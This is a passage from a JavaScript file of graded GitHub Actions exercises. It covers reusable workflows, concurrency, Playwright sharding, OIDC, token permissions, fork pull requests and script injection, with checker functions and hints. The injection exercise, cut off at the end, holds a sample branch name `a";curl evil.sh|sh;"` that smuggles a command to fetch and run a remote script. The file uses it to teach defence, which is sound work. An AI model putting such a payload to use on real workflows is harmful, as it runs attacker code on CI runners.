      tasks: ['Trigger with `workflow_call`.', 'Add inputs `node-version` (string, default "20") and `test-command` (string, default `npm test`).', 'Require a secret `NPM_TOKEN` and use it for `npm ci`.', 'Use both inputs in the steps.'],
      checks: [
        { label: 'Triggered by workflow_call', test: function (h) { return h.has('workflow_call'); }, hint: 'Replace `pull_request:` with `workflow_call:`.' },
        { label: 'Input node-version: string with a default', test: function (h) { var i = (h.evCfg('workflow_call').inputs || {})['node-version'] || {}; return i.type === 'string' && i.default !== undefined; }, hint: 'Add `node-version:` with `type: string` and `default: "20"`.' },
        { label: 'Input test-command: string with a default', test: function (h) { var i = (h.evCfg('workflow_call').inputs || {})['test-command'] || {}; return i.type === 'string' && i.default !== undefined; }, hint: 'Add `test-command:` with `type: string` and `default: npm test`.' },
        { label: 'Secret NPM_TOKEN is required', test: function (h) { var s = (h.evCfg('workflow_call').secrets || {}).NPM_TOKEN; return isObj(s) && s.required === true; }, hint: 'Under `workflow_call:`, add `secrets:` then `NPM_TOKEN:` with `required: true`.' },
        { label: 'Steps use both inputs and the secret', test: function (h) { var t = h.allText(h.doc.jobs); return /inputs\.node-version/.test(t) && /inputs\.test-command/.test(t) && /secrets\.NPM_TOKEN/.test(t); }, hint: 'Use `${{ inputs.node-version }}` in setup-node, `${{ inputs.test-command }}` in a run step, and pass `${{ secrets.NPM_TOKEN }}` as `NODE_AUTH_TOKEN`.' },
      ],
      explain: 'A reusable workflow is an API for other repositories. Inputs need a `type`, and defaults keep callers short. Secrets must be declared, so callers know what to pass; `secrets: inherit` also works inside one organization. Release it with tags such as `v3`, and treat a renamed input as a breaking change.',
      docs: 'https://docs.github.com/en/actions/sharing-automations/reusing-workflows' },

    { id: 'reusable-call', level: 3, topic: 'G1', title: 'Call the shared workflow',
      story: 'This repository has its own copy of the E2E workflow. The platform team now publishes `acme/platform-workflows/.github/workflows/e2e.yml` at tag `v3`. Replace the copy with a call. This repository needs Node.js 22.',
      tasks: ['Replace the steps with one job that calls the shared workflow at `v3`.', 'Pass `node-version: "22"`.', 'Pass the secrets.'],
      checks: [
        { label: 'Calls the shared workflow at v3', test: function (h) { return h.jobList().some(function (j) { return /^acme\/platform-workflows\/\.github\/workflows\/e2e\.ya?ml@v3/.test(h.str(j.job.uses)); }); }, hint: 'Set `uses: acme/platform-workflows/.github/workflows/e2e.yml@v3` on the job.' },
        { label: 'Passes node-version 22', test: function (h) { return h.jobList().some(function (j) { return j.job.uses && isObj(j.job.with) && /^22/.test(h.str(j.job.with['node-version'])); }); }, hint: 'Add `with:` then `node-version: "22"`.' },
        { label: 'Passes secrets', test: function (h) { return h.jobList().some(function (j) { return j.job.uses && (j.job.secrets === 'inherit' || (isObj(j.job.secrets) && 'NPM_TOKEN' in j.job.secrets)); }); }, hint: 'Add `secrets: inherit`, or pass `NPM_TOKEN: ${{ secrets.NPM_TOKEN }}`.' },
        { label: 'The calling job has no runs-on or steps', test: function (h) { return h.jobList().every(function (j) { return !j.job.uses || (!j.job.steps && !j.job['runs-on']); }); }, hint: 'Remove `runs-on` and `steps`. The called workflow defines them.' },
      ],
      explain: 'The caller becomes a few lines, so a security fix in the shared workflow reaches every repository at the next release. Pin to a major tag for convenience, or to a commit SHA for strict control. An organization ruleset can also require this workflow to pass before merge.',
      docs: 'https://docs.github.com/en/actions/sharing-automations/reusing-workflows#calling-a-reusable-workflow' },

    { id: 'concurrency', level: 3, topic: 'G2', title: 'Cancel outdated runs',
      story: 'Developers push 5 commits in 10 minutes. Each push starts a full run, and the queue grows. Cancel the old run when a new commit arrives on the same branch, but never cancel runs on `main`.',
      tasks: ['Add a top-level `concurrency` group per workflow and branch.', 'Cancel in-progress runs, except on `main`.'],
      checks: [
        { label: 'A concurrency group exists', test: function (h) { return isObj(h.doc.concurrency) && !!h.doc.concurrency.group; }, hint: 'Add `concurrency:` with `group:` at the top level.' },
        { label: 'Group includes the workflow and the ref', test: function (h) { var g = h.str((h.doc.concurrency || {}).group); return /github\.workflow/.test(g) && /github\.(ref|head_ref)|pull_request\.number/.test(g); }, hint: 'Use `group: ${{ github.workflow }}-${{ github.ref }}`. Without the workflow name, two workflows can cancel each other.' },
        { label: 'Cancels in-progress runs', test: function (h) { var c = (h.doc.concurrency || {})['cancel-in-progress']; return c === true || /\$\{\{/.test(h.str(c)); }, hint: 'Add `cancel-in-progress: true` or an expression.' },
        { label: 'Never cancels runs on main', test: function (h) { return /refs\/heads\/main/.test(h.str((h.doc.concurrency || {})['cancel-in-progress'])); }, hint: 'Use `cancel-in-progress: ${{ github.ref != \'refs/heads/main\' }}`.' },
      ],
      explain: 'Runs with the same group key run one at a time. `cancel-in-progress` stops the older run, which saves runner minutes on busy branches. On `main`, every commit must finish so the history of results stays complete, so the expression turns cancel off there.',
      docs: 'https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs' },

    { id: 'sharding', level: 3, topic: 'G2', title: 'Shard Playwright across 4 machines',
      story: 'The E2E job takes 40 minutes on one runner. Split it into 4 shards that run in parallel, then merge the results into one HTML report.',
      tasks: ['Add a matrix `shard: [1, 2, 3, 4]` with fail-fast off.', 'Run `npx playwright test --shard=<n>/4` with the blob reporter.', 'Upload each blob report with a unique name.', 'Add a `merge-reports` job that runs after all shards, also after failures, and merges the reports.'],
      checks: [
        { label: 'Matrix has 4 shards, fail-fast off', test: function (h) { var s = (h.job('e2e') || {}).strategy || {}; var m = s.matrix || {}; return s['fail-fast'] === false && Object.keys(m).some(function (k) { return asList(m[k]).length === 4; }); }, hint: 'Add `strategy:` with `fail-fast: false` and `matrix: shard: [1, 2, 3, 4]`.' },
        { label: 'Runs one shard per job', test: function (h) { return /--shard[= ]\$\{\{\s*matrix\.[\w-]+\s*\}\}\/4/.test(h.runs(h.job('e2e'))); }, hint: 'Run `npx playwright test --shard=${{ matrix.shard }}/4 --reporter=blob`.' },
        { label: 'Each shard uploads a uniquely named report', test: function (h) { return !!h.findStep(function (s, x) { return x.jid === 'e2e' && h.uses(s, 'actions/upload-artifact', 4) && isObj(s.with) && /matrix\./.test(h.str(s.with.name)); }); }, hint: 'Use `name: blob-report-${{ matrix.shard }}`. In v4, two uploads with the same name fail.' },
        { label: 'merge-reports needs e2e and runs after failures', test: function (h) { var m = h.job('merge-reports'); return !!m && h.needs(m).indexOf('e2e') !== -1 && /always\(\)|!\s*cancelled\(\)/.test(h.str(m.if)); }, hint: 'Add a `merge-reports` job with `needs: e2e` and `if: ${{ !cancelled() }}`. Without it, a failed shard skips the report.' },
        { label: 'Downloads all shards and merges them', test: function (h) { var m = h.job('merge-reports'); return !!m && /merge-reports/.test(h.runs(m)) && h.steps(m).some(function (s) { return h.uses(s, 'actions/download-artifact', 4) && isObj(s.with) && (s.with.pattern || s.with['merge-multiple']); }); }, hint: 'Use `actions/download-artifact@v4` with `pattern: blob-report-*` and `merge-multiple: true`, then `npx playwright merge-reports --reporter html ./all-blob-reports`.' },
      ],
      explain: 'Sharding splits tests across machines; with `fullyParallel: true` in the config, Playwright splits by test, so shards are balanced. Each shard writes a blob report. The merge job collects them and builds one HTML report, even when a shard failed. 4 shards cut wall time about 4×, but they cost 4 runners.',
      docs: 'https://playwright.dev/docs/test-sharding' },

    { id: 'oidc', level: 3, topic: 'G3', title: 'Deploy to AWS without stored keys',
      story: 'This workflow uses long-lived AWS access keys stored as GitHub secrets. Security wants them deleted. The IAM role `arn:aws:iam::123456789012:role/gha-results-uploader` already trusts GitHub OIDC for this repository.',
      tasks: ['Let the job request an OIDC token.', 'Assume the role with `role-to-assume`.', 'Remove every use of the AWS key secrets.'],
      checks: [
        { label: 'id-token: write is set', test: function (h) { return h.perm(h.doc.permissions, 'id-token') === 'write' || h.jobList().some(function (j) { return h.perm(j.job.permissions, 'id-token') === 'write'; }); }, hint: 'Add `id-token: write` under `permissions:`. Without it, the job cannot request an OIDC token.' },
        { label: 'contents: read is still set', test: function (h) { var p = h.doc.permissions; return h.perm(p, 'contents') === 'read' || h.jobList().every(function (j) { return h.perm(j.job.permissions, 'contents') === 'read'; }); }, hint: 'When you set any permission, all others become none. Keep `contents: read` so checkout works.' },
        { label: 'Assumes the role with OIDC', test: function (h) { return !!h.findStep(function (s) { return h.uses(s, 'aws-actions/configure-aws-credentials', 4) && isObj(s.with) && /gha-results-uploader/.test(h.str(s.with['role-to-assume'])) && !!s.with['aws-region']; }); }, hint: 'Use `role-to-assume: arn:aws:iam::123456789012:role/gha-results-uploader` and keep `aws-region`.' },
        { label: 'No AWS key secrets anywhere', test: function (h) { return !/AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|aws-access-key-id|aws-secret-access-key/.test(h.text); }, hint: 'Delete `aws-access-key-id` and `aws-secret-access-key`. Then delete the secrets in GitHub and the IAM user keys.' },
      ],
      explain: 'With OIDC, GitHub gives the job a short-lived signed token. AWS STS checks the token against the role trust policy (repository, branch or environment in the `sub` claim) and returns credentials that expire in about an hour. No long-lived key exists, so none can leak.',
      docs: 'https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services' },

    { id: 'least-privilege', level: 3, topic: 'G3', title: 'Least-privilege GITHUB_TOKEN',
      story: 'The workflow gives the token `write-all`. Only the `comment` job writes, and it writes only a pull request comment.',
      tasks: ['Set the top-level permissions to read the code only.', 'Give `comment` the one write permission that it needs.'],
      checks: [
        { label: 'Top level is contents: read', test: function (h) { return isObj(h.doc.permissions) && h.doc.permissions.contents === 'read' && !Object.keys(h.doc.permissions).some(function (k) { return h.doc.permissions[k] === 'write'; }); }, hint: 'Replace `write-all` with `permissions:` then `contents: read`.' },
        { label: 'comment has pull-requests: write', test: function (h) { var c = h.job('comment'); return !!c && h.perm(c.permissions, 'pull-requests') === 'write'; }, hint: 'Add `permissions: pull-requests: write` to the `comment` job. PR comments use the issues API, and `pull-requests: write` allows them on pull requests.' },
        { label: 'test has no write permission', test: function (h) { var t = h.job('test'); return !!t && !(isObj(t.permissions) && Object.keys(t.permissions).some(function (k) { return t.permissions[k] === 'write'; })) && t.permissions !== 'write-all'; }, hint: 'Do not add write permissions to `test`.' },
      ],
      explain: 'The `GITHUB_TOKEN` is created for each run. If a step is compromised, it can do only what the token allows. A job-level `permissions` block replaces the top-level block for that job, so give the write scope only where it is needed.',
      docs: 'https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token' },

    { id: 'fork-safe', level: 3, topic: 'G3', title: 'Fix the fork pull request leak',
      story: 'A contributor opened a pull request from a fork. Their test script printed `TEST_API_TOKEN` to the log. This workflow ran their code with secrets and a write token. Fix it.',
      tasks: ['Use a trigger that runs fork code without secrets.', 'Check out the code normally.', 'Remove the secret from the test step.', 'Read-only token.'],
      checks: [
        { label: 'No pull_request_target', test: function (h) { return !h.has('pull_request_target'); }, hint: 'Use `pull_request`. For fork PRs, it gives no secrets and a read-only token.' },
        { label: 'Runs on pull_request', test: function (h) { return h.has('pull_request'); }, hint: 'Add `pull_request:` under `on:`.' },
        { label: 'No checkout of the PR head by hand', test: function (h) { return !/pull_request\.head\.(sha|ref)|head_ref/.test(h.allText(h.doc.jobs)); }, hint: 'Remove `ref: ${{ github.event.pull_request.head.sha }}`. With `pull_request`, checkout already gets the merge commit.' },
        { label: 'No secrets in the test job', test: function (h) { return !/secrets\./.test(h.allText(h.doc.jobs)); }, hint: 'Remove `TEST_API_TOKEN`. Tests for untrusted code must not need secrets. Use mocks, or run secret tests after merge.' },
        { label: 'Token is read-only', test: function (h) { var p = h.doc.permissions; return isObj(p) && !Object.keys(p).some(function (k) { return p[k] === 'write'; }); }, hint: 'Set `permissions: contents: read`.' },
      ],
      explain: '`pull_request_target` runs in the base repository context, with secrets and a write token. That is safe only when you never run code from the PR. `pull_request` runs fork code with no secrets and a read-only token. Rotate the leaked token first; then fix the workflow.',
      docs: 'https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/' },

    { id: 'injection', level: 3, topic: 'G3', title: 'Stop script injection',
      story: 'This step prints the PR title and branch. An attacker can name a branch `a";curl evil.sh|sh;"` and run commands on the runner. Keep the same output, but make it safe.',
      tasks: ['Move the PR title and branch into `env:` variables.', 'Use the variables in the script with double quotes.'],
      checks: [
        { label: 'No user text inside run', test: function (h) { return !h.allSteps().some(function (x) { return /\$\{\{[^}]*(pull_request\.title|head_ref)[^}]*\}\}/.test(h.str(x.step.run)); }); }, hint: 'Remove `${{ github.event.pull_request.title }}` and `${{ github.head_ref }}` from `run:`.' },
        { label: 'Values pass through env', test: function (h) { return !!h.findStep(function (s) { var e = h.allText(s.env); return /pull_request\.title/.test(e) && /head_ref/.test(e); }); }, hint: 'Add `env:` to the step: `PR_TITLE: ${{ github.event.pull_request.title }}` and `PR_BRANCH: ${{ github.head_ref }}`.' },
